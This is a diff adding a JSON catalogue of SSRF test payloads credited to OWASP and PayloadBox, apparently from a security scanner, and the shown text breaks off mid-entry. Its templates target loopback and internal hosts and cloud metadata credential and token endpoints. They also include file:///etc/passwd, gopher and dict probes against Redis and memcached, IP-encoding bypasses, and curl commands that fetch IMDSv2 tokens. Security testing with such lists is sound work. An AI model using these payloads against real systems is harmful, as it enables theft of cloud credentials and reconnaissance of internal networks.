@@ -1,0 +1,2756 @@
+[
+  {
+    "id": "ssrf-owasp-0001",
+    "name": "Basic SSRF",
+    "template": "http://127.0.0.1",
+    "description": "Basic SSRF probe from OWASP. Tests application handling of: http://127.0.0.1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0002",
+    "name": "Basic SSRF #2",
+    "template": "http://localhost",
+    "description": "Basic SSRF probe from OWASP. Tests application handling of: http://localhost",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0003",
+    "name": "Basic SSRF #3",
+    "template": "http://0.0.0.0",
+    "description": "Basic SSRF probe from OWASP. Tests application handling of: http://0.0.0.0",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0004",
+    "name": "Basic SSRF #4",
+    "template": "http://[::1]",
+    "description": "Basic SSRF probe from OWASP. Tests application handling of: http://[::1]",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0005",
+    "name": "Basic SSRF #5",
+    "template": "http://[::]",
+    "description": "Basic SSRF probe from OWASP. Tests application handling of: http://[::]",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0006",
+    "name": "Port scanning",
+    "template": "http://127.0.0.1:22",
+    "description": "Port scanning probe from OWASP. Tests application handling of: http://127.0.0.1:22",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0007",
+    "name": "Port scanning #2",
+    "template": "http://127.0.0.1:80",
+    "description": "Port scanning probe from OWASP. Tests application handling of: http://127.0.0.1:80",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0008",
+    "name": "Port scanning #3",
+    "template": "http://127.0.0.1:443",
+    "description": "Port scanning probe from OWASP. Tests application handling of: http://127.0.0.1:443",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0009",
+    "name": "Port scanning #4",
+    "template": "http://127.0.0.1:3306",
+    "description": "Port scanning probe from OWASP. Tests application handling of: http://127.0.0.1:3306",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0010",
+    "name": "Port scanning #5",
+    "template": "http://127.0.0.1:5432",
+    "description": "Port scanning probe from OWASP. Tests application handling of: http://127.0.0.1:5432",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0011",
+    "name": "Port scanning #6",
+    "template": "http://127.0.0.1:6379",
+    "description": "Port scanning probe from OWASP. Tests application handling of: http://127.0.0.1:6379",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0012",
+    "name": "Port scanning #7",
+    "template": "http://127.0.0.1:8080",
+    "description": "Port scanning probe from OWASP. Tests application handling of: http://127.0.0.1:8080",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0013",
+    "name": "Port scanning #8",
+    "template": "http://127.0.0.1:27017",
+    "description": "Port scanning probe from OWASP. Tests application handling of: http://127.0.0.1:27017",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0014",
+    "name": "AWS",
+    "template": "http://169.254.169.254/latest/meta-data/",
+    "description": "AWS probe from OWASP. Tests application handling of: http://169.254.169.254/latest/...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0015",
+    "name": "AWS #2",
+    "template": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "description": "AWS probe from OWASP. Tests application handling of: http://169.254.169.254/latest/...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0016",
+    "name": "AWS #3",
+    "template": "http://169.254.169.254/latest/user-data/",
+    "description": "AWS probe from OWASP. Tests application handling of: http://169.254.169.254/latest/...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0017",
+    "name": "Google Cloud",
+    "template": "http://metadata.google.internal/computeMetadata/v1/",
+    "description": "Google Cloud probe from OWASP. Tests application handling of: http://metadata.google.interna...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0018",
+    "name": "Google Cloud #2",
+    "template": "http://metadata.google.internal/computeMetadata/v1/instance/",
+    "description": "Google Cloud probe from OWASP. Tests application handling of: http://metadata.google.interna...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0019",
+    "name": "Google Cloud #3",
+    "template": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "description": "Google Cloud probe from OWASP. Tests application handling of: http://metadata.google.interna...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0020",
+    "name": "Azure",
+    "template": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "description": "Azure probe from OWASP. Tests application handling of: http://169.254.169.254/metadat...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0021",
+    "name": "Azure #2",
+    "template": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+    "description": "Azure probe from OWASP. Tests application handling of: http://169.254.169.254/metadat...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0022",
+    "name": "Digital Ocean",
+    "template": "http://169.254.169.254/metadata/v1/",
+    "description": "Digital Ocean probe from OWASP. Tests application handling of: http://169.254.169.254/metadat...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0023",
+    "name": "Digital Ocean #2",
+    "template": "http://169.254.169.254/metadata/v1/id",
+    "description": "Digital Ocean probe from OWASP. Tests application handling of: http://169.254.169.254/metadat...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0024",
+    "name": "Internal network scanning",
+    "template": "http://192.168.0.1",
+    "description": "Internal network scanning probe from OWASP. Tests application handling of: http://192.168.0.1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0025",
+    "name": "Internal network scanning #2",
+    "template": "http://192.168.1.1",
+    "description": "Internal network scanning probe from OWASP. Tests application handling of: http://192.168.1.1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0026",
+    "name": "Internal network scanning #3",
+    "template": "http://10.0.0.1",
+    "description": "Internal network scanning probe from OWASP. Tests application handling of: http://10.0.0.1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0027",
+    "name": "Internal network scanning #4",
+    "template": "http://172.16.0.1",
+    "description": "Internal network scanning probe from OWASP. Tests application handling of: http://172.16.0.1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0028",
+    "name": "Protocol handlers",
+    "template": "file:///etc/passwd",
+    "description": "Protocol handlers probe from OWASP. Tests application handling of: file:///etc/passwd",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0029",
+    "name": "Protocol handlers #2",
+    "template": "file:///c:/windows/win.ini",
+    "description": "Protocol handlers probe from OWASP. Tests application handling of: file:///c:/windows/win.ini",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0030",
+    "name": "Protocol handlers #3",
+    "template": "dict://127.0.0.1:11211/",
+    "description": "Protocol handlers probe from OWASP. Tests application handling of: dict://127.0.0.1:11211/",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0031",
+    "name": "Protocol handlers #4",
+    "template": "gopher://127.0.0.1:6379/_INFO",
+    "description": "Protocol handlers probe from OWASP. Tests application handling of: gopher://127.0.0.1:6379/_INFO",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0032",
+    "name": "Protocol handlers #5",
+    "template": "ldap://127.0.0.1:389",
+    "description": "Protocol handlers probe from OWASP. Tests application handling of: ldap://127.0.0.1:389",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0033",
+    "name": "Protocol handlers #6",
+    "template": "tftp://127.0.0.1:69",
+    "description": "Protocol handlers probe from OWASP. Tests application handling of: tftp://127.0.0.1:69",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0034",
+    "name": "Using decimal IP (127.0.0.1 in decimal)",
+    "template": "http://2130706433",
+    "description": "Using decimal IP (127.0.0.1 in decimal) probe from OWASP. Tests application handling of: http://2130706433",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0035",
+    "name": "Using decimal IP (192.168.0.1 in decimal)",
+    "template": "http://3232235521",
+    "description": "Using decimal IP (192.168.0.1 in decimal) probe from OWASP. Tests application handling of: http://3232235521",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0036",
+    "name": "Using octal IP",
+    "template": "http://0177.0.0.1",
+    "description": "Using octal IP probe from OWASP. Tests application handling of: http://0177.0.0.1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0037",
+    "name": "Using octal IP #2",
+    "template": "http://0x7f.0x0.0x0.0x1",
+    "description": "Using octal IP probe from OWASP. Tests application handling of: http://0x7f.0x0.0x0.0x1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0038",
+    "name": "Using hex IP",
+    "template": "http://0x7f000001",
+    "description": "Using hex IP probe from OWASP. Tests application handling of: http://0x7f000001",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0039",
+    "name": "DNS rebinding",
+    "template": "http://spoofed.burpcollaborator.net",
+    "description": "DNS rebinding probe from OWASP. Tests application handling of: http://spoofed.burpcollaborato...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0040",
+    "name": "URL encoding",
+    "template": "http://127.0.0.1%23@example.com",
+    "description": "URL encoding probe from OWASP. Tests application handling of: http://127.0.0.1%23@example.co...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0041",
+    "name": "URL encoding #2",
+    "template": "http://example.com@127.0.0.1",
+    "description": "URL encoding probe from OWASP. Tests application handling of: http://example.com@127.0.0.1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0042",
+    "name": "URL encoding #3",
+    "template": "http://127.0.0.1%00.example.com",
+    "description": "URL encoding probe from OWASP. Tests application handling of: http://127.0.0.1%00.example.co...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0043",
+    "name": "URL encoding #4",
+    "template": "http://127.0.0.1%2f%2f@example.com",
+    "description": "URL encoding probe from OWASP. Tests application handling of: http://127.0.0.1%2f%2f@example...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0044",
+    "name": "IPv6 localhost",
+    "template": "http://[0:0:0:0:0:0:0:1]",
+    "description": "IPv6 localhost probe from OWASP. Tests application handling of: http://[0:0:0:0:0:0:0:1]",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0045",
+    "name": "IPv6 localhost #2",
+    "template": "http://[0000:0000:0000:0000:0000:0000:0000:0001]",
+    "description": "IPv6 localhost probe from OWASP. Tests application handling of: http://[0000:0000:0000:0000:00...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0046",
+    "name": "Redirect-based SSRF",
+    "template": "http://redirect.example.com?url=http://127.0.0.1",
+    "description": "Redirect-based SSRF probe from OWASP. Tests application handling of: http://redirect.example.com?ur...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0047",
+    "name": "AWS IMDSv2 (requires token)",
+    "template": "TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`",
+    "description": "AWS IMDSv2 (requires token) probe from OWASP. Tests application handling of: TOKEN=`curl -X PUT \"http://169...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0048",
+    "name": "AWS IMDSv2 (requires token) #2",
+    "template": "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/",
+    "description": "AWS IMDSv2 (requires token) probe from OWASP. Tests application handling of: curl -H \"X-aws-ec2-metadata-to...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0049",
+    "name": "Advanced cloud metadata & instance identity",
+    "template": "http://169.254.169.254/latest/dynamic/instance-identity/signature",
+    "description": "Advanced cloud metadata & instance identity probe from OWASP. Tests application handling of: http://169.254.169.254/latest/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0050",
+    "name": "Advanced cloud metadata & instance identity #2",
+    "template": "http://metadata.google.internal/computeMetadata/v1/oslogin/",
+    "description": "Advanced cloud metadata & instance identity probe from OWASP. Tests application handling of: http://metadata.google.interna...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0051",
+    "name": "Advanced cloud metadata & instance identity #3",
+    "template": "http://[fd00:ec2::254]/latest/dynamic/instance-identity/document",
+    "description": "Advanced cloud metadata & instance identity probe from OWASP. Tests application handling of: http://[fd00:ec2::254]/latest/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0052",
+    "name": "Advanced cloud metadata & instance identity #4",
+    "template": "http://169.254.169.254/latest/meta-data/iam/security-credentials/attacker-role",
+    "description": "Advanced cloud metadata & instance identity probe from OWASP. Tests application handling of: http://169.254.169.254/latest/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0053",
+    "name": "Numeric / encoded host bypasses (additional forms)",
+    "template": "http://2130706433:80",
+    "description": "Numeric / encoded host bypasses (additional forms) probe from OWASP. Tests application handling of: http://2130706433:80",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0054",
+    "name": "Numeric / encoded host bypasses (additional forms) #2",
+    "template": "http://017700000001",
+    "description": "Numeric / encoded host bypasses (additional forms) probe from OWASP. Tests application handling of: http://017700000001",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0055",
+    "name": "Numeric / encoded host bypasses (additional forms) #3",
+    "template": "https://0x7f000001",
+    "description": "Numeric / encoded host bypasses (additional forms) probe from OWASP. Tests application handling of: https://0x7f000001",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0056",
+    "name": "Numeric / encoded host bypasses (additional forms) #4",
+    "template": "http://[::ffff:127.0.0.1]:8080",
+    "description": "Numeric / encoded host bypasses (additional forms) probe from OWASP. Tests application handling of: http://[::ffff:127.0.0.1]:8080",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0057",
+    "name": "Additional protocol handlers",
+    "template": "ftp://127.0.0.1",
+    "description": "Additional protocol handlers probe from OWASP. Tests application handling of: ftp://127.0.0.1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0058",
+    "name": "Additional protocol handlers #2",
+    "template": "tftp://[::1]:69",
+    "description": "Additional protocol handlers probe from OWASP. Tests application handling of: tftp://[::1]:69",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0059",
+    "name": "Additional protocol handlers #3",
+    "template": "gopher://localhost:11211/_stats%0d%0a",
+    "description": "Additional protocol handlers probe from OWASP. Tests application handling of: gopher://localhost:11211/_stat...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0060",
+    "name": "Additional protocol handlers #4",
+    "template": "http://%2f%2fvar%2frun%2fdocker.sock/containers/json",
+    "description": "Additional protocol handlers probe from OWASP. Tests application handling of: http://%2f%2fvar%2frun%2fdocke...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0061",
+    "name": "Expanded internal network ranges",
+    "template": "http://10.0.0.0",
+    "description": "Expanded internal network ranges probe from OWASP. Tests application handling of: http://10.0.0.0",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0062",
+    "name": "Expanded internal network ranges #2",
+    "template": "http://172.16.0.0",
+    "description": "Expanded internal network ranges probe from OWASP. Tests application handling of: http://172.16.0.0",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "ssrf-payloads.txt"
+  },
+  {
+    "id": "ssrf-owasp-0063",
+    "name": "Expanded internal network ranges #3",
+    "template": "http://192.168.0.0",
+    "description": "Expanded internal network ranges probe from OWASP. Tests application handling of: http://192.168.0.0",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-owasp-0064",
+    "name": "Expanded internal network ranges #4",
+    "template": "http://169.254.0.0",
+    "description": "Expanded internal network ranges probe from OWASP. Tests application handling of: http://169.254.0.0",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "ssrf-payloads.txt, ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0001",
+    "name": "Ssrf Injection #1",
+    "template": "http://localhost:80",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:80",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0002",
+    "name": "Ssrf Injection #2",
+    "template": "http://localhost:443",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:443",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0003",
+    "name": "Ssrf Injection #3",
+    "template": "http://localhost:22",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:22",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0004",
+    "name": "Ssrf Injection #4",
+    "template": "http://localhost:3306",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:3306",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0005",
+    "name": "Ssrf Injection #5",
+    "template": "http://localhost:5432",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:5432",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0006",
+    "name": "Ssrf Injection #6",
+    "template": "http://localhost:6379",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:6379",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0007",
+    "name": "Ssrf Injection #7",
+    "template": "http://localhost:8080",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:8080",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0008",
+    "name": "Ssrf Injection #8",
+    "template": "http://localhost:8443",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:8443",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0009",
+    "name": "Ssrf Injection #9",
+    "template": "http://127.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0010",
+    "name": "Ssrf Injection #10",
+    "template": "http://127.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0011",
+    "name": "Ssrf Injection #11",
+    "template": "http://0.0.0.0:80",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://0.0.0.0:80",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0012",
+    "name": "Ssrf Injection #12",
+    "template": "http://[::1]:80",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://[::1]:80",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0013",
+    "name": "Ssrf Injection #13",
+    "template": "http://[::ffff:127.0.0.1]",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://[::ffff:127.0.0.1]",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0014",
+    "name": "Ssrf Injection #14",
+    "template": "http://[::1%1]",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://[::1%1]",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0015",
+    "name": "Ssrf Injection #15",
+    "template": "http://167772161",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://167772161",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0016",
+    "name": "Ssrf Injection #16",
+    "template": "http://0177.0000.0000.0001",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://0177.0000.0000.0001",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0017",
+    "name": "Ssrf Injection #17",
+    "template": "http://0x7f.0x0.0x1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://0x7f.0x0.0x1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0018",
+    "name": "Ssrf Injection #18",
+    "template": "http://0x7f.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://0x7f.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0019",
+    "name": "Ssrf Injection #19",
+    "template": "http://0x7f.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://0x7f.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0020",
+    "name": "Ssrf Injection #20",
+    "template": "http://0177.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://0177.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0021",
+    "name": "Ssrf Injection #21",
+    "template": "http://169.254.169.254",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0022",
+    "name": "Ssrf Injection #22",
+    "template": "http://169.254.169.254/latest/dynamic/instance-identity/",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/latest/dynamic/instance-identity/",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0023",
+    "name": "Ssrf Injection #23",
+    "template": "http://[fd00:ec2::254]/latest/meta-data/",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://[fd00:ec2::254]/latest/meta-data/",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0024",
+    "name": "Ssrf Injection #24",
+    "template": "http://instance-data",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://instance-data",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0025",
+    "name": "Ssrf Injection #25",
+    "template": "http://instance-data.ec2.internal",
